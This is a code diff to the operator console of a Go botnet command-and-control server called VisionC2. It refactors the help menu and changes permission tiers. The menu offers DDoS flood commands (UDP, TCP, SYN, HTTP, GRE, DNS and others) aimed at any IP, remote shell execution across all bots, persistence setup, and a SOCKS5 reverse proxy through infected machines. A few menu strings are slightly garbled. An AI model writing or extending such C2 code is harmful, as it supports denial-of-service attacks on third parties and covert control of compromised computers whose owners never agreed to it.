@@ -15,8 +15,6 @@ import (
 	"sync"
 	"time"
 )
-
-
 const (
 	// File paths
 	USERS_FILE = "users.json"
@@ -476,9 +474,9 @@ func (c *client) canUseDDoS() bool {
 }
 
 func (c *client) canUseShell() bool {
-	// Shell commands require Pro or higher
+	// Shell commands require Admin or higher
 	level := c.user.GetLevel()
-	return level == Pro || level == Admin || level == Owner
+	return level == Admin || level == Owner
 }
 
 func (c *client) canUseBotManagement() bool {
@@ -498,7 +496,119 @@ func (c *client) canTargetSpecificBot() bool {
 	level := c.user.GetLevel()
 	return level == Pro || level == Admin || level == Owner
 }
+func (c *client) showHelpMenu(conn net.Conn) {
+	c.writeHeader(conn)
 
+	if c.canUseDDoS() {
+		c.writeGeneralCommands(conn)
+		c.writeAttackCommands(conn)
+	}
+
+	if c.canUseShell() {
+		c.writeShellCommands(conn)
+	}
+
+	if c.canTargetSpecificBot() {
+		c.writeBotTargeting(conn)
+	}
+
+	if c.canUseBotManagement() {
+		c.writeBotManagement(conn)
+	}
+
+	if c.canUsePrivate() {
+		c.writePrivateCommands(conn)
+	}
+
+	c.writeFooter(conn)
+}
+
+func (c *client) writeHeader(conn net.Conn) {
+	conn.Write([]byte("\r\n"))
+	conn.Write([]byte("\033[1;97m╔════════════════════════════════��═════════════════════════════╗\r\n"))
+	conn.Write([]byte(fmt.Sprintf("\033[1;97m║                    \033[1;31mVisionC2 Help Menu [%s]\033[1;97m              ║\r\n", c.getLevelString())))
+	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+}
+
+func (c *client) writeGeneralCommands(conn net.Conn) {
+	commands := []string{
+		"║  \033[1;32mGeneral Commands\033[1;97m                                           ║",
+		"║    bots          - List all connected bots                   ║",
+		"║    clear/cls     - Clear screen                              ║",
+		"║    banner        - Show banner                               ║",
+		"║    help/?         - Show this help menu                       ║",
+		"║    ongoing       - Show ongoing attacks                      ║",
+		"║    logout/exit   - Disconnect from C2                        ║",
+	}
+	c.writeSection(conn, commands)
+}
+
+func (c *client) writeAttackCommands(conn net.Conn) {
+	commands := []string{
+		"║  \033[1;31mAttack Commands\033[1;97m (sent to ALL bots)                      ║",
+		"║    !udpflood <ip> <port> <time>                              ║",
+		"║    !tcpflood <ip> <port> <time>                              ║",
+		"║    !http     <ip> <port> <time>                              ║",
+		"║    !syn      <ip> <port> <time>                              ║",
+		"║    !ack      <ip> <port> <time>                              ║",
+		"║    !gre      <ip> <port> <time>                              ║",
+		"║    ! dns      <ip> <port> <time>                              ║",
+	}
+	c.writeSection(conn, commands)
+}
+
+func (c *client) writeShellCommands(conn net.Conn) {
+	commands := []string{
+		"║  \033[1;36mShell Commands\033[1;97m (sent to ALL bots)                       ║",
+		"║    !shell <command>  - Remote Scripting                      ║",
+		"║    !detach <command> - Run command in background             ║",
+		"║    !stream <command> - Real-time output streaming            ║",
+	}
+	c.writeSection(conn, commands)
+}
+
+func (c *client) writeBotTargeting(conn net.Conn) {
+	commands := []string{
+		"║  \033[1;33mBot Targeting\033[1;97m                                           ║",
+		"║    ! <botid> <cmd>    - Send command to specific bot          ║",
+		"║    Example: !abc123 !shell whoami                            ║",
+	}
+	c.writeSection(conn, commands)
+}
+
+func (c *client) writeBotManagement(conn net.Conn) {
+	commands := []string{
+		"║  \033[1;34mBot Management\033[1;97m (sent to ALL bots)                       ║",
+		"║    ! reinstall        - Force reinstall bot                   ║",
+		"║    !lolnogtfo        - Kill/remove bot                       ║",
+		"║    !persist          - Setup persistence                     ║",
+		"║    !info             - Get bot info                          ║",
+	}
+	c.writeSection(conn, commands)
+}
+
+func (c *client) writePrivateCommands(conn net.Conn) {
+	commands := []string{
+		"║  \033[1;35mPrivate Commands\033[1;97m (Owner only)                           ║",
+		"║    private           - Show private commands                  ║",
+		"║    db                - Show user database                     ║",
+		"║    !socks <port>     - Establish SOCKS5 reverse proxy        ║",
+		"║    !stopsocks        - Terminate proxy connections            ║",
+	}
+	c.writeSection(conn, commands)
+}
+
+func (c *client) writeSection(conn net.Conn, commands []string) {
+	conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
+	for _, cmd := range commands {
+		conn.Write([]byte(fmt.Sprintf("\033[1;97m%s\r\n", cmd)))
+	}
+}
+
+func (c *client) writeFooter(conn net.Conn) {
+	conn.Write([]byte("\033[1;97m╚══════════════════════════════════════════════════════════════╝\r\n"))
+	conn.Write([]byte("\033[0m\r\n"))
+}
 func (c *client) getLevelString() string {
 	level := c.user.GetLevel()
 	switch level {
@@ -981,65 +1091,7 @@ func handleRequest(conn net.Conn) {
 					conn.Write([]byte("\033[1;33mPersistence command sent to all bots\r\n\033[0m"))
 
 				case "help":
-					conn.Write([]byte("\r\n"))
-					conn.Write([]byte(fmt.Sprintf("\033[1;97m╔══════════════════════════════════════════════════════════════╗\r\n")))
-					conn.Write([]byte(fmt.Sprintf("\033[1;97m║                    \033[1;31mVisionC2 Help Menu [%s]\033[1;97m                 ║\r\n", c.getLevelString())))
-					conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
-
-					// Show commands based on user level
-					if c.canUseDDoS() {
-						conn.Write([]byte("\033[1;97m║  \033[1;32mGeneral Commands\033[1;97m                                           ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    bots          - List all connected bots                   ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    clear/cls     - Clear screen                              ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    banner        - Show banner                               ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    help/?        - Show this help menu                       ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    ongoing       - Show ongoing attacks                      ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    logout/exit   - Disconnect from C2                        ║\r\n"))
-
-						conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
-						conn.Write([]byte("\033[1;97m║  \033[1;31mAttack Commands\033[1;97m (sent to ALL bots)                        ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !udpflood <ip> <port> <time>                              ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !tcpflood <ip> <port> <time>                              ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !http     <ip> <port> <time>                              ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !syn      <ip> <port> <time>                              ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !ack      <ip> <port> <time>                              ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !gre      <ip> <port> <time>                              ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !dns      <ip> <port> <time>                              ║\r\n"))
-					}
-
-					if c.canUseShell() {
-						conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
-						conn.Write([]byte("\033[1;97m║  \033[1;36mShell Commands\033[1;97m (sent to ALL bots)                         ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !shell  <cmd>  - Execute command and get output           ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !detach <cmd>  - Run command in background                ║\r\n"))
-					}
-
-					if c.canTargetSpecificBot() {
-						conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
-						conn.Write([]byte("\033[1;97m║  \033[1;33mBot Targeting\033[1;97m                                              ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !<botid> <cmd>  - Send command to specific bot            ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    Example: !abc123 !shell whoami                            ║\r\n"))
-					}
-
-					if c.canUseBotManagement() {
-						conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
-						conn.Write([]byte("\033[1;97m║  \033[1;34mBot Management\033[1;97m (sent to ALL bots)                         ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !reinstall      - Force reinstall bot                     ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !lolnogtfo      - Kill/remove bot                         ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    persist         - Setup persistence                       ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    !info           - Get bot info                            ║\r\n"))
-					}
-
-					if c.canUsePrivate() {
-						conn.Write([]byte("\033[1;97m╠══════════════════════════════════════════════════════════════╣\r\n"))
-						conn.Write([]byte("\033[1;97m║  \033[1;35mPrivate Commands\033[1;97m (Owner only)                             ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    private        - Show private commands                    ║\r\n"))
-						conn.Write([]byte("\033[1;97m║    db             - Show user database                       ║\r\n"))
-					}
-
-					conn.Write([]byte("\033[1;97m╚══════════════════════════════════════════════════════════════╝\r\n"))
-					conn.Write([]byte("\033[0m\r\n"))
-
+					c.showHelpMenu(conn)
 				case "db":
 					if !c.canUsePrivate() {
 						conn.Write([]byte("\033[1;31m❌ Permission denied: Database access requires Owner level\r\n\033[0m"))
@@ -1195,4 +1247,3 @@ func handleRequest(conn net.Conn) {
 		}
 	}
 }
-
